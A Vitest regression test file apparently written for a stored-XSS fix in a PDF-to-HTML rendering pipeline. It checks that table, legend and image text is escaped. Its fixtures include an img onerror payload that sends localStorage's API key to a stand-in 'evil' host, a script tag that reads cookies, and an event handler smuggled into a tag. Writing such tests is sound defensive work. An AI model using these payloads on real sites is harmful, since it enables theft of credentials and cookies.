// Stored-XSS hardening of the reconstructed-table / legend / image render paths (bug-hunt H3, 2026-06-17).
// Cell/header/caption/description text on a reconstructed-from-image table is VISION OUTPUT from an
// untrusted PDF. It is interpolated into element content by the block renderer and later re-rendered via
// dangerouslySetInnerHTML (the recon-table mini-preview, view_pdf_audit_source.jsx:7202) in the MAIN app
// origin (FERPA localStorage + the API key). sanitizeField only strips \n/\0 — it does NOT escape markup.
// The fix routes every untrusted element-content sink through escapeTextField (already used by the
// headings/lists): markup is escaped, only attribute-less safe inline tags are re-allowed, so no scripting
// vector survives. The grid path keeps using the esc()-ing _emitAccessibleTableHtml (no double-escaping).

import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';

const src = readFileSync(resolve(process.cwd(), 'doc_pipeline_source.jsx'), 'utf8');

// Extract the real escapeTextField the fix relies on (self-contained, references nothing external).
const s = src.indexOf('const escapeTextField = (val) => {');
const e = src.indexOf('const safeHref', s);
if (s === -1 || e === -1) throw new Error('escapeTextField extraction markers missing');
const escapeTextField = new Function(src.slice(s, e) + '\n; return escapeTextField;')();

describe('escapeTextField neutralizes the scripting vectors a malicious PDF could inject', () => {
  it('an <img onerror=…> payload is escaped — no live <img tag survives', () => {
    const out = escapeTextField('<img src=x onerror="fetch(\'//evil/?k=\'+localStorage.apiKey)">');
    expect(out).not.toContain('<img');
    expect(out).toContain('&lt;img');
  });
  it('a <script> payload is escaped', () => {
    const out = escapeTextField('<script>alert(document.cookie)</script>');
    expect(out).not.toContain('<script');
    expect(out).toContain('&lt;script&gt;');
  });
  it('attributes on an allow-listed tag do NOT pass as a live tag (no event-handler smuggling)', () => {
    const out = escapeTextField('<strong onclick="evil()">x</strong>');
    expect(out).not.toContain('<strong onclick'); // the attributed opening tag is NOT re-allowed
    expect(out).toContain('&lt;strong onclick');  // it stays escaped/inert (the handler can't fire)
  });
  it('attribute-less safe emphasis is preserved (intended formatting survives)', () => {
    expect(escapeTextField('<strong>bold</strong> and <em>italic</em>')).toBe('<strong>bold</strong> and <em>italic</em>');
  });
  it('plain table text is unchanged, and "5 < 10" is now escaped (a latent CORRECTNESS fix too)', () => {
    expect(escapeTextField('Q1 2024')).toBe('Q1 2024');
    expect(escapeTextField('5 < 10')).toBe('5 &lt; 10'); // raw "<" used to render as a broken tag start
  });
});

describe('every untrusted element-content sink in the block renderer routes through escapeTextField', () => {
  it('the flat table path escapes caption, headers, and BOTH cell branches', () => {
    expect(src).toContain('<caption style="font-weight:bold;text-align:left;margin-bottom:0.5rem;color:${docStyle.headingColor}">`+escapeTextField(sanitizeField(block.caption))+`</caption>');
    expect(src).toContain('text-align:left">`+escapeTextField(sanitizeField(h))+`</th>'); // header cell
    // #G (2026-07-05): both cell branches route through _cellEsc — _alloCellRichText over the SAME
    // escaper, so list-ish cell markup becomes a real list while every text run is still escaped.
    expect(src).toContain('const _cellEsc = (v) => _alloCellRichText(v, (t) => escapeTextField(sanitizeField(t)));');
    expect(src).toContain('padding:8px 12px">`+_cellEsc(row)+`</td></tr>'); // single-cell row
    expect(src).toContain('padding:8px 12px">`+_cellEsc(cell)+`</td>'); // grid cell
  });
  it('the definition_list (legend) path escapes caption, intro, headings, markers, labels', () => {
    expect(src).toContain('escapeTextField(sanitizeField(block.caption))+`</figcaption>');
    expect(src).toContain('escapeTextField(sanitizeField(block.intro))+`</p>');
    expect(src).toContain('escapeTextField(sanitizeField(sec.title))+`</h4>');
    expect(src).toContain('e.marker ? escapeTextField(sanitizeField(e.marker)) : ');
    expect(src).toContain('e.label ? escapeTextField(sanitizeField(e.label)) : ');
  });
  it('the image placeholder escapes the visible description + figcaption', () => {
    expect(src).toContain('${escapeTextField(_imgDesc.substring(0, 140))}');
    expect(src).toContain('${escapeTextField(_captionText)}</figcaption>');
  });
  it('regression guard: the OLD unescaped bare-sanitizeField table sinks are gone', () => {
    expect(src).not.toContain('">`+sanitizeField(block.caption)+`</caption>'); // was the flat-table caption sink
    expect(src).not.toContain('`+sanitizeField(h)+`</th>');
    expect(src).not.toContain('`+sanitizeField(cell)+`</td>');
  });
});
